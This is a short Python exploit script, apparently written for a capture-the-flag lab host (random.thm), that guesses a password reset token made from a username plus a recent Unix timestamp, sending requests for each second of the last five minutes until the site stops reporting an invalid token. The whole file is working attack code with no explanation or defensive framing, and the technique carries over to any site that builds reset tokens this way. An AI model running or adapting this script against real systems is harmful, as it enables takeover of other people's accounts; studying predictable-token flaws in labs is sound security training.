import requests
import sys
import time  # <-- added

# Function to brute force the reset token
def brute_force_token(username):
    url = "http://random.thm:8090/case/reset_password.php"
    
    # Get current timestamp automatically
    start_timestamp = int(time.time())
    
    print(f"[+] Starting timestamp: {start_timestamp}")
    
    # Try tokens within a range of -5 minutes
    for i in range(-300, 0):
        current_timestamp = start_timestamp + i
        token = f"{username}{current_timestamp}"
        params = {'token': token}
        
        response = requests.get(url, params=params)
        
        # Check if the token is valid
        if "Invalid or expired token." not in response.text:
            print(f"[✔] Correct token identified: {token}")
            return token
        else:
            print(f"[✖] Tried token: {token} (Invalid)")
    
    print("[-] No valid token found in the given range.")
    return None


if len(sys.argv) != 2:
    print("Usage: python exploit.py <username>")
    sys.exit(1)

username = sys.argv[1]

# Call function without passing timestamp
brute_force_token(username)
